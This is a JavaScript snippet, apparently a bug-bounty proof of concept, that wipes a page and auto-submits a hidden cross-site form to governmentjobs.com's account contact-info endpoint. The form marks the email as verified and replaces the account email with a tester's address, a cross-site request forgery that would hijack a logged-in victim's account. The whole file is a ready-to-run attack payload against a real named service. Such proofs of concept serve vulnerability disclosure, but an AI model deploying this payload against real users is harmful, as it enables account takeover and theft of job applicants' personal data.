document.body.innerHTML = ''; // Clear the body

// Create a form element
let form = document.createElement('form');
form.setAttribute('action', 'https://www.governmentjobs.com/api/generalInfo/contactInfo?fromAppProcess=false&returnUrl=https%253A%252F%252Fwww.governmentjobs.com%252FApplications%252FAccountSettings%2523contact');
form.setAttribute('method', 'POST');

// Function to create and append hidden input elements
function addHiddenInput(form, name, value) {
    let input = document.createElement('input');
    input.setAttribute('type', 'hidden');
    input.setAttribute('name', name);
    input.setAttribute('value', value);
    form.appendChild(input);
}

// Adding hidden inputs to the form
addHiddenInput(form, 'isDiscardChange', 'false');
addHiddenInput(form, 'enableEmailVerification', 'true');
addHiddenInput(form, 'fromAppProcess', 'false');
addHiddenInput(form, 'isEmailVerified', 'true');
addHiddenInput(form, 'isAccountSettingsPage', 'true');
addHiddenInput(form, 'name[firstName]', 'xxx');
addHiddenInput(form, 'name[middleName]', 'x');
addHiddenInput(form, 'name[lastName]', 'xx');
addHiddenInput(form, 'name[formerName]', '');
addHiddenInput(form, 'address[address1]', 'dazdazdww');
addHiddenInput(form, 'address[address2]', '');
addHiddenInput(form, 'address[city]', 'mrxbugcrowd');
addHiddenInput(form, 'address[state][id]', '54');
addHiddenInput(form, 'address[state][abbrvState]', 'IT');
addHiddenInput(form, 'address[state][name]', '');
addHiddenInput(form, 'address[state][countryId]', '0');
addHiddenInput(form, 'address[zipCode]', '10001');
addHiddenInput(form, 'address[country][id]', '7');
addHiddenInput(form, 'address[country][name]', 'Angola');
addHiddenInput(form, 'address[filteredStates][0][id]', '54');
addHiddenInput(form, 'address[filteredStates][0][abbrvState]', 'IT');
addHiddenInput(form, 'address[filteredStates][0][name]', 'International');
addHiddenInput(form, 'address[filteredStates][0][sortCode]', '2');
addHiddenInput(form, 'address[filteredStates][0][isUs]', 'false');
addHiddenInput(form, 'address[filteredStates][0][countryId]', '0');
addHiddenInput(form, 'phone[primaryPhone]', '');
addHiddenInput(form, 'phone[primaryPhoneExt]', '');
addHiddenInput(form, 'phone[alternatePhone]', '');
addHiddenInput(form, 'phone[alternatePhoneExt]', '');
addHiddenInput(form, 'textCaptchaViewModel[userAnswer]', '');
addHiddenInput(form, 'textCaptchaViewModel[isBusy]', 'false');
addHiddenInput(form, 'textCaptchaViewModel[customLabelHtmlContent]', '');
addHiddenInput(form, 'textCaptchaViewModel[customUserAnswerInputId]', '');
addHiddenInput(form, 'initialEmail', 'poc4mrxx+123@gmail.com');
addHiddenInput(form, 'emailAddress', 'poc4mrxx+123@gmail.com');
addHiddenInput(form, 'isPasswordSet', 'true');
addHiddenInput(form, 'textCaptchaEnabled', 'true');
addHiddenInput(form, 'isEmailVerificationMode', 'false');
addHiddenInput(form, 'showCaptchaValidationMessage', 'false');
addHiddenInput(form, 'isEmailAddressAvailable', 'true');
addHiddenInput(form, 'changeEmailNotification', 'Your current email address is poc4mrxx+123@gmail.com. To change the email address, please visit account settings page.');
addHiddenInput(form, 'notificationPreference', '1');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailAddress]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][enableEmailVerification]', 'true');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][isNeedToHideHeader]', 'true');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][isNeedToHideInstructions]', 'true');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][verificationCodeLabelText]', 'Please enter the 6 digit code sent to your email address.');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][verificationCodeAriaLabelText]', 'We\'ve sent a 6 digit code to your email address and the code is only valid for 30 minutes. Please enter the code below.');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][useCustomVerifyButton]', 'true');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForResendCode][userAnswer]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForResendCode][isBusy]', 'false');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForResendCode][customLabelHtmlContent]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForResendCode][customUserAnswerInputId]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForVerificationCode][userAnswer]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForVerificationCode][isBusy]', 'false');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForVerificationCode][customLabelHtmlContent]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaViewModelForVerificationCode][customUserAnswerInputId]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][textCaptchaEnabled]', 'true');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][isNeedToShowEmailVerificationForm]', 'false');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][isEmailVerified]', 'true');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][userEmail]', 'poc4mrxx+123@gmail.com');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][verificationAttemptsCount]', '0');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][resendEmailVerificationCount]', '0');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][isEmailVerificationSubmitButtonEnabled]', 'false');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][emailVerificationCode]', '');
addHiddenInput(form, 'contactInfoEmailVerificationViewModel[emailVerificationViewModel][changedEmailAddressWasAdded]', 'false');

// Create and add the submit button
let submitButton = document.createElement('input');
submitButton.setAttribute('type', 'submit');
submitButton.setAttribute('value', 'Submit request');
form.appendChild(submitButton);

// Append the form to the body
document.body.appendChild(form);

// Submit the form automatically
document.forms[0].submit();
